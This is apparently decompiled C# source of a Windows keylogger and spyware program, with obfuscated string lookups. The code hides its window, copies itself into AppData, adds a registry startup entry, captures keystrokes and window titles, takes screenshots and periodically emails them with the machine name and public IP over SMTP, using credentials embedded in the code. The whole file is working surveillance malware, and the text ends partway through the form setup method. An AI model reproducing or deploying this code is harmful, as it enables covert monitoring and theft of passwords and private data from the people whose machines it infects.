using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ns2;

namespace ns0;

internal sealed class Form0 : Form
{
	[Flags]
	public enum Enum0
	{
		flag_0 = 1,
		flag_1 = 2,
		flag_2 = 4,
		flag_3 = 0x10,
		flag_4 = 0x20,
		flag_5 = 0x40
	}

	private Class1 class1_0;

	public int int_0 = 5;

	private string string_0 = string.Empty;

	private IContainer icontainer_0;

	private ListBox listBox_0;

	private TextBox textBox_0;

	private TextBox textBox_1;

	private TextBox textBox_2;

	private ListBox listBox_1;

	private TextBox textBox_3;

	private Label label_0;

	private Label label_1;

	private Label label_2;

	private Timer timer_0;

	private Timer timer_1;

	private BackgroundWorker backgroundWorker_0;

	[NonSerialized]
	internal static GetString getString_0;

	CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("wininet.dll", CharSet = CharSet.Auto)]
	private static extern bool InternetGetConnectedState(ref Enum0 enum0_0, int int_1);

	public Form0()
	{
		method_5();
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(getString_0(107396798), writable: true);
		registryKey.SetValue(getString_0(107396769), getString_0(107396748) + Application.get_ExecutablePath() + getString_0(107396748));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
	}

	private void Form0_Load(object sender, EventArgs e)
	{
		try
		{
			method_0();
			string hostName = Dns.GetHostName();
			((Control)label_2).set_Text(hostName);
			WebClient webClient = new WebClient();
			string input = webClient.DownloadString(getString_0(107396743));
			input = new Regex(getString_0(107396706)).Match(input).Value;
			webClient.Dispose();
			((Control)label_1).set_Text(input);
			((Control)textBox_3).set_Text(getString_0(107396653));
		}
		catch
		{
		}
		try
		{
			MailMessage mailMessage = new MailMessage();
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Credentials = new NetworkCredential(getString_0(107396652), getString_0(107397127));
			smtpClient.Port = 587;
			smtpClient.Host = getString_0(107397078);
			smtpClient.EnableSsl = true;
			mailMessage.To.Add(getString_0(107396652));
			mailMessage.Subject = getString_0(107397089);
			mailMessage.Body = ((Control)label_2).get_Text() + getString_0(107397048) + int_0 + getString_0(107396987);
			mailMessage.From = new MailAddress(getString_0(107396652), ((Control)label_2).get_Text());
			smtpClient.Send(mailMessage);
			listBox_1.get_Items().Clear();
			listBox_0.get_Items().Clear();
		}
		catch
		{
		}
		try
		{
			class1_0 = new Class1();
			class1_0.method_0(method_2);
			class1_0.method_1();
			timer_0.Start();
			timer_0.set_Interval(60000 * int_0);
			timer_1.Start();
			timer_1.set_Interval(5000);
		}
		catch
		{
		}
	}

	public void method_0()
	{
		try
		{
			string sourceFileName = Application.get_ExecutablePath().ToString();
			string_0 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), getString_0(107396954));
			File.Copy(sourceFileName, string_0, overwrite: true);
			Process.Start(string_0);
			method_1();
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
		}
	}

	public void method_1()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(getString_0(107396798), writable: true);
		registryKey.SetValue(getString_0(107396769), getString_0(107396748) + Application.get_ExecutablePath() + getString_0(107396748));
	}

	private void method_2(object sender, EventArgs0 e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			((Control)label_0).set_Text(((object)e.method_0()).ToString());
			if (((Control)label_0).get_Text() == getString_0(107396961))
			{
				TextBox obj = textBox_3;
				((Control)obj).set_Text(((Control)obj).get_Text() + getString_0(107396924));
			}
			if (((Control)label_0).get_Text() == getString_0(107396919))
			{
				TextBox obj2 = textBox_3;
				((Control)obj2).set_Text(((Control)obj2).get_Text() + getString_0(107396914));
			}
			if (((Control)label_0).get_Text() == getString_0(107396941))
			{
				TextBox obj3 = textBox_3;
				((Control)obj3).set_Text(((Control)obj3).get_Text() + getString_0(107396936));
			}
			if (((Control)label_0).get_Text() == getString_0(107396931))
			{
				TextBox obj4 = textBox_3;
				((Control)obj4).set_Text(((Control)obj4).get_Text() + getString_0(107396894));
			}
			if (((Control)label_0).get_Text() == getString_0(107396889))
			{
				TextBox obj5 = textBox_3;
				((Control)obj5).set_Text(((Control)obj5).get_Text() + getString_0(107396884));
			}
			if (((Control)label_0).get_Text() == getString_0(107396911))
			{
				TextBox obj6 = textBox_3;
				((Control)obj6).set_Text(((Control)obj6).get_Text() + getString_0(107396906));
			}
			if (((Control)label_0).get_Text() == getString_0(107396901))
			{
				TextBox obj7 = textBox_3;
				((Control)obj7).set_Text(((Control)obj7).get_Text() + getString_0(107396352));
			}
			if (((Control)label_0).get_Text() == getString_0(107396347))
			{
				TextBox obj8 = textBox_3;
				((Control)obj8).set_Text(((Control)obj8).get_Text() + getString_0(107396342));
			}
			if (((Control)label_0).get_Text() == getString_0(107396337))
			{
				TextBox obj9 = textBox_3;
				((Control)obj9).set_Text(((Control)obj9).get_Text() + getString_0(107396364));
			}
			if (((Control)label_0).get_Text() == getString_0(107396359))
			{
				TextBox obj10 = textBox_3;
				((Control)obj10).set_Text(((Control)obj10).get_Text() + getString_0(107396354));
			}
			if (((Control)label_0).get_Text() == getString_0(107396317))
			{
				TextBox obj11 = textBox_3;
				((Control)obj11).set_Text(((Control)obj11).get_Text() + getString_0(107396924));
			}
			if (((Control)label_0).get_Text() == getString_0(107396336))
			{
				TextBox obj12 = textBox_3;
				((Control)obj12).set_Text(((Control)obj12).get_Text() + getString_0(107396914));
			}
			if (((Control)label_0).get_Text() == getString_0(107396323))
			{
				TextBox obj13 = textBox_3;
				((Control)obj13).set_Text(((Control)obj13).get_Text() + getString_0(107396936));
			}
			if (((Control)label_0).get_Text() == getString_0(107396278))
			{
				TextBox obj14 = textBox_3;
				((Control)obj14).set_Text(((Control)obj14).get_Text() + getString_0(107396894));
			}
			if (((Control)label_0).get_Text() == getString_0(107396297))
			{
				TextBox obj15 = textBox_3;
				((Control)obj15).set_Text(((Control)obj15).get_Text() + getString_0(107396884));
			}
			if (((Control)label_0).get_Text() == getString_0(107396252))
			{
				TextBox obj16 = textBox_3;
				((Control)obj16).set_Text(((Control)obj16).get_Text() + getString_0(107396906));
			}
			if (((Control)label_0).get_Text() == getString_0(107396271))
			{
				TextBox obj17 = textBox_3;
				((Control)obj17).set_Text(((Control)obj17).get_Text() + getString_0(107396352));
			}
			if (((Control)label_0).get_Text() == getString_0(107396258))
			{
				TextBox obj18 = textBox_3;
				((Control)obj18).set_Text(((Control)obj18).get_Text() + getString_0(107396342));
			}
			if (((Control)label_0).get_Text() == getString_0(107396213))
			{
				TextBox obj19 = textBox_3;
				((Control)obj19).set_Text(((Control)obj19).get_Text() + getString_0(107396364));
			}
			if (((Control)label_0).get_Text() == getString_0(107396232))
			{
				TextBox obj20 = textBox_3;
				((Control)obj20).set_Text(((Control)obj20).get_Text() + getString_0(107396354));
			}
			if (((Control)label_0).get_Text() == getString_0(107396187))
			{
				TextBox obj21 = textBox_3;
				((Control)obj21).set_Text(((Control)obj21).get_Text() + getString_0(107396178));
			}
			if (((Control)label_0).get_Text() == getString_0(107396205))
			{
				TextBox obj22 = textBox_3;
				((Control)obj22).set_Text(((Control)obj22).get_Text() + getString_0(107396200));
			}
			if (((Control)label_0).get_Text() == getString_0(107396159))
			{
				TextBox obj23 = textBox_3;
				((Control)obj23).set_Text(((Control)obj23).get_Text() + getString_0(107396150));
			}
			if (((Control)label_0).get_Text() == getString_0(107396173))
			{
				TextBox obj24 = textBox_3;
				((Control)obj24).set_Text(((Control)obj24).get_Text() + getString_0(107396164));
			}
			if (((Control)label_0).get_Text() == getString_0(107396127))
			{
				TextBox obj25 = textBox_3;
				((Control)obj25).set_Text(((Control)obj25).get_Text() + getString_0(107396114));
			}
			if (((Control)label_0).get_Text() == getString_0(107396141))
			{
				TextBox obj26 = textBox_3;
				((Control)obj26).set_Text(((Control)obj26).get_Text() + getString_0(107396132));
			}
			if (((Control)label_0).get_Text() == getString_0(107396607))
			{
				TextBox obj27 = textBox_3;
				((Control)obj27).set_Text(((Control)obj27).get_Text() + getString_0(107396598));
			}
			if (((Control)label_0).get_Text() == getString_0(107396593))
			{
				TextBox obj28 = textBox_3;
				((Control)obj28).set_Text(((Control)obj28).get_Text() + getString_0(107396576));
			}
			if (((Control)label_0).get_Text() == getString_0(107396563))
			{
				TextBox obj29 = textBox_3;
				((Control)obj29).set_Text(((Control)obj29).get_Text() + getString_0(107396582));
			}
			if (((Control)label_0).get_Text() == getString_0(107396537))
			{
				TextBox obj30 = textBox_3;
				((Control)obj30).set_Text(((Control)obj30).get_Text() + getString_0(107396556));
			}
			if (((Control)label_0).get_Text() == getString_0(107396547))
			{
				TextBox obj31 = textBox_3;
				((Control)obj31).set_Text(((Control)obj31).get_Text() + getString_0(107396502));
			}
			if (((Control)label_0).get_Text() == getString_0(107396525))
			{
				TextBox obj32 = textBox_3;
				((Control)obj32).set_Text(((Control)obj32).get_Text() + getString_0(107396480));
			}
			if (((Control)label_0).get_Text() == getString_0(107396475))
			{
				TextBox obj33 = textBox_3;
				((Control)obj33).set_Text(((Control)obj33).get_Text() + getString_0(107396486));
			}
			if (((Control)label_0).get_Text() == getString_0(107396481))
			{
				TextBox obj34 = textBox_3;
				((Control)obj34).set_Text(((Control)obj34).get_Text() + getString_0(107396440));
			}
			if (((Control)label_0).get_Text() == getString_0(107396435))
			{
				TextBox obj35 = textBox_3;
				((Control)obj35).set_Text(((Control)obj35).get_Text() + getString_0(107396458));
			}
			if (((Control)label_0).get_Text() == getString_0(107396453))
			{
				TextBox obj36 = textBox_3;
				((Control)obj36).set_Text(((Control)obj36).get_Text() + getString_0(107396408));
			}
			if (((Control)label_0).get_Text() == getString_0(107396403))
			{
				TextBox obj37 = textBox_3;
				((Control)obj37).set_Text(((Control)obj37).get_Text() + getString_0(107396422));
			}
			if (((Control)label_0).get_Text() == getString_0(107396417))
			{
				TextBox obj38 = textBox_3;
				((Control)obj38).set_Text(((Control)obj38).get_Text() + getString_0(107396400));
			}
			if (((Control)label_0).get_Text() == getString_0(107396395))
			{
				TextBox obj39 = textBox_3;
				((Control)obj39).set_Text(((Control)obj39).get_Text() + getString_0(107396386));
			}
			if (((Control)label_0).get_Text() == getString_0(107395837))
			{
				TextBox obj40 = textBox_3;
				((Control)obj40).set_Text(((Control)obj40).get_Text() + getString_0(107395852));
			}
			if (((Control)label_0).get_Text() == getString_0(107395847))
			{
				TextBox obj41 = textBox_3;
				((Control)obj41).set_Text(((Control)obj41).get_Text() + getString_0(107395802));
			}
			if (((Control)label_0).get_Text() == getString_0(107395821))
			{
				TextBox obj42 = textBox_3;
				((Control)obj42).set_Text(((Control)obj42).get_Text() + getString_0(107395776));
			}
			if (((Control)label_0).get_Text() == getString_0(107395763))
			{
				TextBox obj43 = textBox_3;
				((Control)obj43).set_Text(((Control)obj43).get_Text() + getString_0(107395782));
			}
			if (((Control)label_0).get_Text() == getString_0(107395733))
			{
				TextBox obj44 = textBox_3;
				((Control)obj44).set_Text(((Control)obj44).get_Text() + getString_0(107395760));
			}
			if (((Control)label_0).get_Text() == getString_0(107395751))
			{
				TextBox obj45 = textBox_3;
				((Control)obj45).set_Text(((Control)obj45).get_Text() + getString_0(107395746));
			}
			if (((Control)label_0).get_Text() == getString_0(107395705))
			{
				TextBox obj46 = textBox_3;
				((Control)obj46).set_Text(((Control)obj46).get_Text() + getString_0(107395700));
			}
			if (((Control)label_0).get_Text() == getString_0(107395723))
			{
				TextBox obj47 = textBox_3;
				((Control)obj47).set_Text(((Control)obj47).get_Text() + getString_0(107395718));
			}
			if (((Control)label_0).get_Text() == getString_0(107395677))
			{
				TextBox obj48 = textBox_3;
				((Control)obj48).set_Text(((Control)obj48).get_Text() + getString_0(107395672));
			}
			if (((Control)label_0).get_Text() == getString_0(107395695))
			{
				TextBox obj49 = textBox_3;
				((Control)obj49).set_Text(((Control)obj49).get_Text() + getString_0(107395690));
			}
			if (((Control)label_0).get_Text() == getString_0(107395681))
			{
				TextBox obj50 = textBox_3;
				((Control)obj50).set_Text(((Control)obj50).get_Text() + getString_0(107395644));
			}
			if (((Control)label_0).get_Text() == getString_0(107395635))
			{
				TextBox obj51 = textBox_3;
				((Control)obj51).set_Text(((Control)obj51).get_Text() + getString_0(107395662));
			}
			if (((Control)label_0).get_Text() == getString_0(107395653))
			{
				TextBox obj52 = textBox_3;
				((Control)obj52).set_Text(((Control)obj52).get_Text() + getString_0(107395616));
			}
			if (((Control)label_0).get_Text() == getString_0(107395607))
			{
				TextBox obj53 = textBox_3;
				((Control)obj53).set_Text(((Control)obj53).get_Text() + getString_0(107395602));
			}
			if (((Control)label_0).get_Text() == getString_0(107395625))
			{
				TextBox obj54 = textBox_3;
				((Control)obj54).set_Text(((Control)obj54).get_Text() + getString_0(107395620));
			}
			if (((Control)label_0).get_Text() == getString_0(107396091))
			{
				TextBox obj55 = textBox_3;
				((Control)obj55).set_Text(((Control)obj55).get_Text() + getString_0(107396086));
			}
			if (((Control)label_0).get_Text() == getString_0(107396109))
			{
				TextBox obj56 = textBox_3;
				((Control)obj56).set_Text(((Control)obj56).get_Text() + getString_0(107396100));
			}
			if (((Control)label_0).get_Text() == getString_0(107396059))
			{
				TextBox obj57 = textBox_3;
				((Control)obj57).set_Text(((Control)obj57).get_Text() + getString_0(107396050));
			}
			if (((Control)label_0).get_Text() == getString_0(107396065))
			{
				TextBox obj58 = textBox_3;
				((Control)obj58).set_Text(((Control)obj58).get_Text() + getString_0(107396020));
			}
			if (((Control)label_0).get_Text() == getString_0(107396039))
			{
				TextBox obj59 = textBox_3;
				((Control)obj59).set_Text(((Control)obj59).get_Text() + getString_0(107395998));
			}
			if (((Control)label_0).get_Text() == getString_0(107395989))
			{
				TextBox obj60 = textBox_3;
				((Control)obj60).set_Text(((Control)obj60).get_Text() + getString_0(107396016));
			}
			if (((Control)label_0).get_Text() == getString_0(107395967))
			{
				TextBox obj61 = textBox_3;
				((Control)obj61).set_Text(((Control)obj61).get_Text() + getString_0(107395958));
			}
			if (((Control)label_0).get_Text() == getString_0(107395973))
			{
				TextBox obj62 = textBox_3;
				((Control)obj62).set_Text(((Control)obj62).get_Text() + getString_0(107395932));
			}
			if (((Control)label_0).get_Text() == getString_0(107395951))
			{
				TextBox obj63 = textBox_3;
				((Control)obj63).set_Text(((Control)obj63).get_Text() + getString_0(107395942));
			}
			if (((Control)label_0).get_Text() == getString_0(107395897))
			{
				TextBox obj64 = textBox_3;
				((Control)obj64).set_Text(((Control)obj64).get_Text() + getString_0(107395920));
			}
			if (((Control)label_0).get_Text() == getString_0(107395915))
			{
				TextBox obj65 = textBox_3;
				((Control)obj65).set_Text(((Control)obj65).get_Text() + getString_0(107396132));
			}
			if (((Control)label_0).get_Text() == getString_0(107395870))
			{
				TextBox obj66 = textBox_3;
				((Control)obj66).set_Text(((Control)obj66).get_Text() + getString_0(107396114));
			}
			if (((Control)label_0).get_Text() == getString_0(107395857))
			{
				TextBox obj67 = textBox_3;
				((Control)obj67).set_Text(((Control)obj67).get_Text() + getString_0(107395884));
			}
			if (((Control)label_0).get_Text() == getString_0(107395879))
			{
				TextBox obj68 = textBox_3;
				((Control)obj68).set_Text(((Control)obj68).get_Text() + getString_0(107395322));
			}
			if (((Control)label_0).get_Text() == getString_0(107395341))
			{
				TextBox obj69 = textBox_3;
				((Control)obj69).set_Text(((Control)obj69).get_Text() + getString_0(107395336));
			}
			if (((Control)label_0).get_Text() == getString_0(107395331))
			{
				TextBox obj70 = textBox_3;
				((Control)obj70).set_Text(((Control)obj70).get_Text() + getString_0(107395294));
			}
			if (((Control)label_0).get_Text() == getString_0(107395289))
			{
				TextBox obj71 = textBox_3;
				((Control)obj71).set_Text(((Control)obj71).get_Text() + getString_0(107395284));
			}
			if (((Control)label_0).get_Text() == getString_0(107395311))
			{
				TextBox obj72 = textBox_3;
				((Control)obj72).set_Text(((Control)obj72).get_Text() + getString_0(107395306));
			}
			if (((Control)label_0).get_Text() == getString_0(107395301))
			{
				TextBox obj73 = textBox_3;
				((Control)obj73).set_Text(((Control)obj73).get_Text() + getString_0(107395264));
			}
			if (((Control)label_0).get_Text() == getString_0(107395259))
			{
				TextBox obj74 = textBox_3;
				((Control)obj74).set_Text(((Control)obj74).get_Text() + getString_0(107395254));
			}
			if (((Control)label_0).get_Text() == getString_0(107395249))
			{
				TextBox obj75 = textBox_3;
				((Control)obj75).set_Text(((Control)obj75).get_Text() + getString_0(107395276));
			}
			if (((Control)label_0).get_Text() == getString_0(107395271))
			{
				TextBox obj76 = textBox_3;
				((Control)obj76).set_Text(((Control)obj76).get_Text() + getString_0(107395266));
			}
			if (((Control)label_0).get_Text() == getString_0(107395229))
			{
				TextBox obj77 = textBox_3;
				((Control)obj77).set_Text(((Control)obj77).get_Text() + getString_0(107395224));
			}
			if (((Control)label_0).get_Text() == getString_0(107395219))
			{
				TextBox obj78 = textBox_3;
				((Control)obj78).set_Text(((Control)obj78).get_Text() + getString_0(107395246));
			}
			if (((Control)label_0).get_Text() == getString_0(107395241))
			{
				TextBox obj79 = textBox_3;
				((Control)obj79).set_Text(((Control)obj79).get_Text() + getString_0(107395236));
			}
			if (((Control)label_0).get_Text() == getString_0(107395199))
			{
				TextBox obj80 = textBox_3;
				((Control)obj80).set_Text(((Control)obj80).get_Text() + getString_0(107395194));
			}
			if (((Control)label_0).get_Text() == getString_0(107395189))
			{
				TextBox obj81 = textBox_3;
				((Control)obj81).set_Text(((Control)obj81).get_Text() + getString_0(107395216));
			}
			if (((Control)label_0).get_Text() == getString_0(107395211))
			{
				TextBox obj82 = textBox_3;
				((Control)obj82).set_Text(((Control)obj82).get_Text() + getString_0(107395206));
			}
			if (((Control)label_0).get_Text() == getString_0(107395201))
			{
				TextBox obj83 = textBox_3;
				((Control)obj83).set_Text(((Control)obj83).get_Text() + getString_0(107395164));
			}
			if (((Control)label_0).get_Text() == getString_0(107395159))
			{
				TextBox obj84 = textBox_3;
				((Control)obj84).set_Text(((Control)obj84).get_Text() + getString_0(107395154));
			}
			if (((Control)label_0).get_Text() == getString_0(107395181))
			{
				TextBox obj85 = textBox_3;
				((Control)obj85).set_Text(((Control)obj85).get_Text() + getString_0(107395176));
			}
			if (((Control)label_0).get_Text() == getString_0(107395171))
			{
				TextBox obj86 = textBox_3;
				((Control)obj86).set_Text(((Control)obj86).get_Text() + getString_0(107395134));
			}
			if (((Control)label_0).get_Text() == getString_0(107395129))
			{
				TextBox obj87 = textBox_3;
				((Control)obj87).set_Text(((Control)obj87).get_Text() + getString_0(107395124));
			}
			if (((Control)label_0).get_Text() == getString_0(107395151))
			{
				TextBox obj88 = textBox_3;
				((Control)obj88).set_Text(((Control)obj88).get_Text() + getString_0(107395146));
			}
			if (((Control)label_0).get_Text() == getString_0(107395141))
			{
				TextBox obj89 = textBox_3;
				((Control)obj89).set_Text(((Control)obj89).get_Text() + getString_0(107395104));
			}
			if (((Control)label_0).get_Text() == getString_0(107395099))
			{
				TextBox obj90 = textBox_3;
				((Control)obj90).set_Text(((Control)obj90).get_Text() + getString_0(107395094));
			}
			if (((Control)label_0).get_Text() == getString_0(107395089))
			{
				TextBox obj91 = textBox_3;
				((Control)obj91).set_Text(((Control)obj91).get_Text() + getString_0(107395116));
			}
			if (((Control)label_0).get_Text() == getString_0(107395111))
			{
				TextBox obj92 = textBox_3;
				((Control)obj92).set_Text(((Control)obj92).get_Text() + getString_0(107395106));
			}
			if (((Control)label_0).get_Text() == getString_0(107395581))
			{
				TextBox obj93 = textBox_3;
				((Control)obj93).set_Text(((Control)obj93).get_Text() + getString_0(107395576));
			}
			if (((Control)label_0).get_Text() == getString_0(107395571))
			{
				TextBox obj94 = textBox_3;
				((Control)obj94).set_Text(((Control)obj94).get_Text() + getString_0(107395598));
			}
		}
		catch
		{
		}
	}

	private Bitmap method_3()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size);
		return val;
	}

	private unsafe void timer_0_Tick(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[5];
		try
		{
			Enum0 enum0_ = (Enum0)0;
			((byte*)ptr)[4] = (InternetGetConnectedState(ref enum0_, 0) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[4] != 0 && ((Control)textBox_3).get_Text().Length != 0)
			{
				*(int*)ptr = 0;
				while (listBox_1.get_Items().get_Count() > *(int*)ptr)
				{
					TextBox obj = textBox_2;
					((Control)obj).set_Text(((Control)obj).get_Text() + listBox_1.get_Items().get_Item(*(int*)ptr).ToString() + getString_0(107395593));
					(*(int*)ptr)++;
				}
				Dictionary<string, string> dictionary = new Dictionary<string, string>();
				dictionary.Add(getString_0(107394911), ((Control)label_2).get_Text());
				dictionary.Add(getString_0(107394902), ((Control)textBox_3).get_Text());
				dictionary.Add(getString_0(107394921), ((Control)textBox_2).get_Text());
				backgroundWorker_0.RunWorkerAsync(dictionary);
				listBox_1.get_Items().Clear();
				listBox_0.get_Items().Clear();
				((TextBoxBase)textBox_3).Clear();
				((TextBoxBase)textBox_2).Clear();
			}
		}
		catch
		{
		}
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.MainWindowTitle.Length >= 1 && !listBox_1.get_Items().Contains((object)process.MainWindowTitle))
				{
					listBox_1.get_Items().Add((object)process.MainWindowTitle);
				}
			}
		}
		catch
		{
		}
	}

	public void method_4(string string_1, string string_2, string string_3)
	{
		try
		{
			bool flag;
			if (!File.Exists(getString_0(107394876)))
			{
				Directory.CreateDirectory(getString_0(107394876));
			}
			else if (flag = File.Exists(getString_0(107394847)))
			{
				File.Delete(getString_0(107394847));
			}
			Bitmap val = method_3();
			((Image)val).Save(getString_0(107394847), ImageFormat.get_Bmp());
			((Image)val).Dispose();
			MailMessage mailMessage = new MailMessage();
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Credentials = new NetworkCredential(getString_0(107396652), getString_0(107397127));
			smtpClient.Port = 587;
			smtpClient.Host = getString_0(107397078);
			smtpClient.EnableSsl = true;
			mailMessage.To.Add(getString_0(107396652));
			mailMessage.Subject = getString_0(107394290) + string_1 + getString_0(107394261) + ((Control)label_1).get_Text() + getString_0(107394232);
			mailMessage.Body = getString_0(107394227) + string_2 + getString_0(107393269) + string_3 + getString_0(107396598);
			mailMessage.From = new MailAddress(getString_0(107396652), getString_0(107391055));
			Attachment attachment = new Attachment(getString_0(107394847));
			mailMessage.Attachments.Add(attachment);
			smtpClient.Send(mailMessage);
			attachment.Dispose();
			File.Delete(getString_0(107394847));
		}
		catch
		{
		}
	}

	private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
	{
		try
		{
			Dictionary<string, string> dictionary = (Dictionary<string, string>)e.Argument;
			method_4(dictionary[getString_0(107394911)], dictionary[getString_0(107394902)], dictionary[getString_0(107394921)]);
		}
		catch
		{
		}
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_5()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_022e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0434: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c3: Unknown result type (might be due to invalid IL or missing references)
		icontainer_0 = new Container();
		listBox_0 = new ListBox();
		textBox_0 = new TextBox();
		textBox_1 = new TextBox();
		textBox_2 = new TextBox();
		listBox_1 = new ListBox();
		textBox_3 = new TextBox();
		label_0 = new Label();
		label_1 = new Label();
		label_2 = new Label();
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		backgroundWorker_0 = new BackgroundWorker();
		((Control)this).SuspendLayout();
		((ListControl)listBox_0).set_FormattingEnabled(true);
		listBox_0.set_ItemHeight(16);
		((Control)listBox_0).set_Location(new Point(425, 280));
		((Control)listBox_0).set_Margin(new Padding(4));
		((Control)listBox_0).set_Name(getString_0(107390994));
		((Control)listBox_0).set_Size(new Size(133, 36));
		((Control)listBox_0).set_TabIndex(14);
		((Control)textBox_0).set_Location(new Point(593, 324));
		((Control)textBox_0).set_Margin(new Padding(4));
		((TextBoxBase)textBox_0).set_Multiline(true);
		((Control)textBox_0).set_Name(getString_0(107391013));
		((Control)textBox_0).set_Size(new Size(133, 36));
		((Control)textBox_0).set_TabIndex(13);
		((Control)textBox_1).set_Location(new Point(425, 324));
		((Control)textBox_1).set_Margin(new Padding(4));
		((TextBoxBase)textBox_1).set_Multiline(true);
		((Control)textBox_1).set_Name(getString_0(107391480));
		((Control)textBox_1).set_Size(new Size(133, 36));
		((Control)textBox_1).set_TabIndex(12);
		((Control)textBox_2).set_Location(new Point(257, 324));
		((Control)textBox_2).set_Margin(new Padding(4));
		((TextBoxBase)textBox_2).set_Multiline(true);
		((Control)textBox_2).set_Name(getString_0(107391499));
		((Control)textBox_2).set_Size(new Size(133, 36));
		((Control)textBox_2).set_TabIndex(11);
		((ListControl)listBox_1).set_FormattingEnabled(true);
		listBox_1.set_ItemHeight(16);
		((Control)listBox_1).set_Location(new Point(257, 280));
		((Control)listBox_1).set_Margin(new Padding(4));
		((Control)listBox_1).set_Name(getString_0(107391454));
		((Control)listBox_1).set_Size(new Size(133, 36));
		((Control)listBox_1).set_TabIndex(10);
		((Control)textBox_3).set_Location(new Point(13, 7));
		((Control)textBox_3).set_Margin(new Padding(4));
		((TextBoxBase)textBox_3).set_Multiline(true);
		((Control)textBox_3).set_Name(getString_0(107391441));
		((Control)textBox_3).set_Size(new Size(1025, 249));
		((Control)textBox_3).set_TabIndex(9);
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_Location(new Point(575, 375));
		((Control)label_0).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label_0).set_Name(getString_0(107391460));
		((Control)label_0).set_Size(new Size(46, 17));
		((Control)label_0).set_TabIndex(17);
		((Control)label_0).set_Text(getString_0(107391460));
		((Control)label_1).set_AutoSize(true);
		((Control)label_1).set_Location(new Point(435, 375));
		((Control)label_1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label_1).set_Name(getString_0(107391419));
		((Control)label_1).set_Size(new Size(46, 17));
		((Control)label_1).set_TabIndex(16);
		((Control)label_1).set_Text(getString_0(107391419));
		((Control)label_2).set_AutoSize(true);
		((Control)label_2).set_Location(new Point(290, 375));
		((Control)label_2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label_2).set_Name(getString_0(107394911));
		((Control)label_2).set_Size(new Size(46, 17));
		((Control)label_2).set_TabIndex(15);
		((Control)label_2).set_Text(getString_0(107394911));
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		backgroundWorker_0.DoWork += backgroundWorker_0_DoWork;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(1051, 423));
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)label_2);
		((Control)this).get_Controls().Add((Control)(object)listBox_0);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)textBox_1);
		((Control)this).get_Controls().Add((Control)(object)textBox_2);
		((Control)this).get_Controls().Add((Control)(object)listBox_1);
		((Control)this).get_Controls().Add((Control)(object)textBox_3);
